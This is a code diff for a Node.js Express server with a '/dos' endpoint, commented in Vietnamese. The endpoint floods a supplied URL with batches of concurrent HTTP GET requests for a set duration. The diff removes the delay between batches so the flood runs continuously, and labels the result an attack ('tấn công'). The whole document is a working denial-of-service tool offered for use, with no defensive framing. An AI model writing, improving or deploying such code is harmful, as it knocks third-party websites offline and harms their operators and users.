@@ -24,23 +24,24 @@ app.post('/dos', (req, res) => {
     }
 
     let isRunning = true;
+    const startTime = Date.now();
 
-    // Dừng sau thời gian đã định (60 giây)
-    setTimeout(() => {
-        isRunning = false;
-        res.send('Quá trình xử lý đã hoàn tất.');
-    }, duration);
-
-    // Khởi động các threads
+    // Khởi động các threads liên tục trong 60 giây
     const startAttacks = () => {
         if (isRunning) {
+            const currentTime = Date.now();
+            if (currentTime - startTime >= duration) {
+                isRunning = false;
+                return res.send('Quá trình tấn công đã kết thúc sau 60 giây.');
+            }
+
             const attackPromises = [];
             for (let i = 0; i < threads; i++) {
                 attackPromises.push(axios.get(url).catch(() => null)); // Bắt lỗi nếu có
             }
             Promise.all(attackPromises).then(() => {
                 // Gửi yêu cầu xong thì đợi 1 giây và gọi lại hàm này
-                setTimeout(startAttacks, 1);
+                setTimeout(startAttacks, 0); // 1000 ms = 1 giây
             });
         }
     };
@@ -50,4 +51,4 @@ app.post('/dos', (req, res) => {
 
 app.listen(process.env.PORT || 8080, () => {
     console.log(`Server is running on port ${process.env.PORT || 8080}`);
-});
+}); 
